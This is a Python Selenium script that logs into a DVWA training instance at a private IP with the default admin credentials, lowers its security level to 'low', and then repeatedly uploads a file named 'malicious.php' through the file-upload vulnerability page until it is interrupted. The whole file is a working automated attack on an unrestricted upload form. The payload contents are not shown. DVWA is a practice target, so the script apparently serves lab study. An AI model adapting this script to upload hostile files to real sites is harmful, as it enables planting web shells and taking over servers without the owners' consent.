from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


def login(driver, login_addr, usrname, pswrd):
    driver.get(login_addr)
    assert "Login" in driver.title

    username_inp = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, "username"))
    )
    passw_inp = driver.find_element(By.NAME, "password")

    username_inp.clear()
    passw_inp.clear()

    username_inp.send_keys(usrname)
    passw_inp.send_keys(pswrd)
    passw_inp.send_keys(Keys.RETURN)


def set_security_lvl(driver, security_lvl_addr, security_lvl):
    driver.get(security_lvl_addr)
    security_lvls = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, "security"))
    )
    all_options = security_lvls.find_elements(By.TAG_NAME, "option")
    for option in all_options:
        if option.get_attribute("value") == security_lvl:
            option.click()
            break
    driver.find_element(By.NAME, "seclev_submit").click()


def send_exploit(driver, expl_addr, file_path):
    driver.get(expl_addr)
    upload_btn = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, "uploaded"))
    )
    upload_btn.send_keys(file_path)

    driver.find_element(By.NAME, "Upload").click()

    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.TAG_NAME, "pre"))
    )


if __name__ == "__main__":
    LOGIN_ADDR = "http://192.168.21.3/dvwa/login.php"
    MALICIOUS_FILE_PATH = "./malicious.php"
    FILE_UPL_ADDR = "http://192.168.21.3/dvwa/vulnerabilities/upload/"
    SECURITY_LVL_ADDR = "http://192.168.21.3/dvwa/security.php"

    driver = webdriver.Firefox()

    try:
        login(driver, LOGIN_ADDR, "admin", "password")
        set_security_lvl(driver, SECURITY_LVL_ADDR, "low")
        print("Ctrl + C to stop file upload")
        while True:
            send_exploit(driver, FILE_UPL_ADDR, MALICIOUS_FILE_PATH)
    except KeyboardInterrupt:
        print("Stopping attack.")
    finally:
        driver.quit()
